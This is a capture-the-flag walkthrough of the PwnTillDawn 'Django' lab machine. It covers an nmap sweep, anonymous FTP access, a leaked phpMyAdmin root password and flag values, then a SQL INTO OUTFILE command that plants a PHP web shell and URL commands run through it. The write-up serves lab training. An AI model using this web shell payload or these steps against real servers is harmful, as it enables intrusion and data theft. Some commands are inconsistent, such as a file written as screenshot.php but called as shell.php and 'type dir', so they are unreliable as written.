# Django-PwnTillDawn

## 1. run `nmap -sn 10.150.150.10-254` to scan for available hosts.


## 2. `10.150.150.212` is up


## 3. FileZilla
<img width="1199" height="896" alt="image" src="https://github.com/user-attachments/assets/5373c57c-8f29-407c-b850-c972f565c519" />

#### - Enter the host **(10.150.150.212)** , username **(anonymous)** and port **(21)**


## 4. Connect
<img width="1199" height="891" alt="image" src="https://github.com/user-attachments/assets/d40ec197-cd7a-493d-811b-a8fc465480b4" />


#### - Found a folder **"FLAG"** and 2 files **"xampp-control.log"** & **"zen.txt"**
<img width="599" height="478" alt="image" src="https://github.com/user-attachments/assets/031699ba-eb66-4ac5-850d-e6f2c0cb3ae4" />

#### - The folder **"FLAG"** contained the file **"FLAG19.txt"**

<img width="668" height="161" alt="image" src="https://github.com/user-attachments/assets/1e349e90-72b6-4213-8ce1-96cb94fbde06" />

#### - Download all 3 files


## 5. xampp-control.log
<img width="825" height="885" alt="image" src="https://github.com/user-attachments/assets/05f20156-fe1b-4792-80ee-56edc6278053" />

#### - Line 10 says the password is written in **"C:\XAMPP\passwords.txt"**


## 6. Zen.txt 
<img width="814" height="885" alt="image" src="https://github.com/user-attachments/assets/bc5bb143-82c9-4c24-be6f-20d653fb0037" />


## 7. Flag 19
<img width="824" height="881" alt="image" src="https://github.com/user-attachments/assets/4e704b9e-a7ef-4182-ad52-63ddb0b761c0" />

#### - The flag is **"a393b6fb540379e942b0010afa3058985fb8cec3"** . It does not require to be decoded.


## 8. `ftp 10.150.150.212`
<img width="652" height="783" alt="image" src="https://github.com/user-attachments/assets/80eebc41-f11d-4bd1-80a1-20f16e8f3cbd" />

#### - Gonna try to access **"C:\XAMPP\passwords.txt"**
#### - run `cd /..` to change directory to the one above.
#### - Found the **"XAMPP"** folder

<img width="625" height="614" alt="image" src="https://github.com/user-attachments/assets/4c1bc822-b3df-43e0-8c2f-602da986c51f" />

#### - run `cd xampp`
#### - Found **"passwords.txt"**
#### - run `get passwords.txt` to download it.

<img width="788" height="681" alt="image" src="https://github.com/user-attachments/assets/47bc28e3-884d-4499-a8a1-ec3844fc6feb" />

#### - Contents of **"passwords.txt"**
#### - Got credentials for **phpMyAdmin**
#### - User = root
#### - Password = thebarrierbetween


## 9. Flag 18

<img width="1477" height="946" alt="image" src="https://github.com/user-attachments/assets/4c596508-0a6f-4562-929f-537ba343f570" />

#### - Landing page of `10.150.150.212`
#### - Press the **phpMyAdmin** button

<img width="1810" height="940" alt="image" src="https://github.com/user-attachments/assets/af555501-3017-42c0-b437-15767f1a38df" />

<img width="933" height="546" alt="image" src="https://github.com/user-attachments/assets/cf5cfc8c-c738-436d-bfaf-f7ed5a49c961" />

#### - One of the databases is Flag 18
#### - Flag 18 = **ad1357d394eba91febe5a6d33dd3ec6dd0abc056**


## 10. Shell

<img width="991" height="372" alt="image" src="https://github.com/user-attachments/assets/b8312a46-ce57-4184-abf7-acce611f400e" />

#### - Having access to phpMyAdmin gives up the opportunity to upload a shell.php for a Remote Code Execution (RCE)
#### - In the SQL tab put **"SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE 'C:/xampp/htdocs/screenshot.php';"** and press go to run.
#### - In the search bar enter **http://10.150.150.212/shell.php?cmd=whoami** to see if the shell worked.

<img width="811" height="281" alt="image" src="https://github.com/user-attachments/assets/db719038-fc97-4d0a-ae06-9560bf20f0be" />

#### - It now says we are the user **"chuck.norris"**


## 11. dir & Flag 20

<img width="1013" height="376" alt="image" src="https://github.com/user-attachments/assets/94cbf3ba-2035-415d-abcd-6ffb43df49e3" />

#### - Run `dir` to see all the folders in the directory.
#### - There is a XAMPP folder
#### - `http://10.150.150.212/shell.php?cmd=dir C:\xampp`

<img width="1908" height="763" alt="image" src="https://github.com/user-attachments/assets/b1f0da4f-029b-4660-b1eb-6c4b228cda8a" />
<img width="872" height="254" alt="image" src="https://github.com/user-attachments/assets/08e826de-bc40-4a28-9a03-ab2f1ab9729f" />


#### - Found FLAG 20 in the folder.
#### - `http://10.150.150.212/shell.php?cmd=type dir C:\xampp\FLAG20.txt`
#### - note: In the same way you use cat in your Kali Linux terminal to see the contents of a file, Windows uses type.
#### - Flag 20 = **"a9435c140b6667cf2f24fcf6a9a1ea6b8574c3e7"**


## 12. Flag 11

<img width="1916" height="526" alt="image" src="https://github.com/user-attachments/assets/e4215640-b3cb-4795-a855-047276fd0e47" />

#### - `http://10.150.150.212/shell.php?cmd=dir C:\` to open the root folder
#### - Access **"users"** folder

<img width="1031" height="296" alt="image" src="https://github.com/user-attachments/assets/be608084-9409-4f1a-b82f-3cef9a54b14e" />

#### - Only 1 user which is **"chuck.norris"**
#### - `http://10.150.150.212/shell.php?cmd=dir C:\users\chuck.norris`

<img width="1118" height="442" alt="image" src="https://github.com/user-attachments/assets/b4fb9312-40a6-44cd-8641-f99fc6c91628" />

#### - `http://10.150.150.212/shell.php?cmd=dir C:\users\chuck.norris\Desktop`

<img width="1162" height="282" alt="image" src="https://github.com/user-attachments/assets/0183283c-0374-43f1-b4c8-12d2e79e8ed3" />

#### - Found **FLAG11.txt**
#### - `http://10.150.150.212/shell.php?cmd=type dir C:\users\chuck.norris\Desktop\FLAG11.txt`

<img width="1057" height="215" alt="image" src="https://github.com/user-attachments/assets/5bf68e2c-dbdc-4bf3-b92a-ef172dc65725" />

#### - Got the final flag
#### - Flag 11 = **"7a763d39f68ece1edd1037074ff8d129451af0b1"**


<img width="707" height="364" alt="image" src="https://github.com/user-attachments/assets/56dcfbc5-805d-4856-b097-b75a034376d3" />
















